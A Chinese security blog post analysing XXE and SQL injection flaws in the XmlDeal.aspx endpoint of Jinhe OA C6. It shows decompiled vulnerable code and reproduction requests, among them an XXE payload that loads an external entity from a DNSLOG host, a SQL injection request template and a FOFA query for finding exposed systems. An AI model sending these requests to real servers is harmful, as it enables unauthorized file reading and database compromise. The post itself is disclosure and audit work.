---
title: "金和OA XmlDeal.aspx XXE+SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-XmlDeal-xxe-sqli.html
asset_dir: assets/金和oa-xmldeal.aspx-xxe+sql注入漏洞
---

# 金和OA XmlDeal.aspx XXE+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/11/30 13:30
- 367浏览
- [0评论](#comment)
- 38分钟阅读

深入探索

技术文章订阅

SQL

物流软件安全

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `XmlDeal.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

SQL注入防护

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

在线安全工具

Web安全课程

SQL注入检测工具

## XXE漏洞

直接根据 `XmlDeal.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Blog.dll` 将其进行反编译后找到 **XmlDeal** 的处理逻辑

代码安全审计

```
private StringBuilder sb = new StringBuilder();
protected HtmlForm Form1;

protected void Page_Load(object sender, EventArgs e)
{
  string str = "";
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.Load(this.Request.InputStream);
  switch (xmlDocument.DocumentElement.SelectSingleNode("//root//DealFlag").InnerText.Trim())
  {
    case "BlogPersonal":
      str = this.DealBlogPersonal(xmlDocument);
      break;
    case "BlogPhotoListAddReview":
      str = this.BlogPhotoListAddReview(xmlDocument);
      break;
    case "BlogPhotoDelPhoto":
      str = this.BlogPhotoDelPhoto(xmlDocument);
      break;
    case "BlogPhotoListDelReview":
      str = this.BlogPhotoListDelReview(xmlDocument);
      break;
    case "BlogIndexSetSession":
      str = this.BlogSetSession(xmlDocument);
      break;
    case "BlogIndexSeachBlog":
      str = this.BlogSeachBlog(xmlDocument);
      break;
    case "BlogIndexShowMore":
      str = this.BlogShowMore(xmlDocument);
      break;
    case "BlogPhotoListLoadReview":
      str = this.BlogPhotoListLoadReview(xmlDocument);
      break;
    case "BlogPhotoListGetReviewCount":
      str = this.BlogPhotoListGetReviewCount(xmlDocument);
      break;
    case "BlogPhotoListGetPhotoId":
      str = this.BlogPhotoListGetPhotoId(xmlDocument);
      break;
    case "UpLoadDialogDelTempDirectory":
      str = this.UpLoadDialogDelTempDirectory(xmlDocument);
      break;
    case "BlogGetEncrypt":
      str = this.BlogGetEncrypt(xmlDocument);
      break;
    case "AddKM":
      str = this.BlogGetContent(xmlDocument);
      break;
    case "AddType":
      str = this.BlogGetTypeName(xmlDocument);
      break;
  }
  this.Response.Write(str);
  this.Response.End();
}
```

请求内容直接使 `XmlDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

## SQL注入漏洞

### BlogPhotoDelPhoto

当**DealFlag=BlogPhotoDelPhoto**时

```
private string BlogPhotoDelPhoto(XmlDocument xmlDocument)
{
  XmlNode xmlNode = xmlDocument.DocumentElement.SelectSingleNode("//root//imgSrc");
  xmlDocument.DocumentElement.SelectSingleNode("//root//strUserCode");
  string str1 = !string.op_Equality(this.Request.ApplicationPath, "/") ? this.Request.ApplicationPath + "/JHSoft.Web.Blog/" : this.Request.ApplicationPath;
  string lower1 = xmlNode.InnerText.ToLower();
  string lower2 = str1.ToLower();
  string[] strArray = lower1.Replace(lower2, ",").Split(new char[1]
  {
    ','
  });
  bool flag1 = false;
  flag1 = new JHSoft.Blog.Blog().delPhoto(lower2 + strArray[1]);
```

跟进`delPhoto`方法

```
public bool delPhoto(string strSrcImg)
{
  bool flag = true;
  string QueryString = $"update BlogPhoto set DelFlag=1 where photoPath = '{strSrcImg}'";
  DBOperator dbOperator = DBOperatorFactory.GetDBOperator();
  dbOperator.ExecSQLReInt(QueryString);
  if (dbOperator.IsError)
  {
    this.StrErrorMessage = dbOperator.ErrorMessage;
    flag = false;
  }
  return flag;
}
```

非常明显的SQL拼接导致[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)产生，但是需要注意**imgSrc需要满足以下条件**

漏洞扫描服务

- 包含当前请求的路径，即 `/c6/Jhsoft.Web.blog/`
- sql注入payload位置在包含路径后，才会在替换后使用逗号分割的第二个位置拼接进SQL语句

其他几个位置

### BlogSetSession

[![金和OA XmlDeal.aspx XXE+SQL注入漏洞](images/img-001-b5b2bc69698c.webp)](https://image.mrxn.net/b81ee0c8e0374a31a369fdf87b3889b3.webp)

[![金和OA XmlDeal.aspx XXE+SQL注入漏洞](images/img-002-45d82e757ab3.webp)](https://image.mrxn.net/b3b432f45d454633aff5394501b46071.webp)

## 任意文件夹删除

[![金和OA XmlDeal.aspx XXE+SQL注入漏洞](images/img-003-6761b309e6dd.webp)](https://image.mrxn.net/a2319585cd204745872413e991af8f41.webp)

## 硬编码的DES密钥

[![金和OA XmlDeal.aspx XXE+SQL注入漏洞](images/img-004-17a451660b59.webp)](https://image.mrxn.net/efc43c2578f545eaa19c138c8809d93b.webp)

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.blog/XmlDeal.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

网络安全

[![金和OA XmlDeal.aspx XXE+SQL注入漏洞](images/img-005-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

## SQL

```
POST /c6/Jhsoft.Web.blog/XmlDeal.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<root>
<DealFlag>BlogPhotoDelPhoto</DealFlag>
<imgSrc>SQLI_POC</imgSrc>
<strUserCode>admin</strUserCode>
</root>
```

[![金和OA XmlDeal.aspx XXE+SQL注入漏洞](images/img-006-0109b8c986f5.webp)](https://image.mrxn.net/592347322a0d4a47b74385f7eb9a9245.webp)

成功延时 4 秒

SQL注入防护

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.XXE漏洞](#toc-4-1-)
- [4.2.SQL注入漏洞](#toc-4-2-)
- [4.2.1.BlogPhotoDelPhoto](#toc-4-2-1-)
- [4.2.2.BlogSetSession](#toc-4-2-2-)
- [4.3.任意文件夹删除](#toc-4-3-)
- [4.4.硬编码的DES密钥](#toc-4-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.XXE](#toc-5-1-)
- [5.2.SQL](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
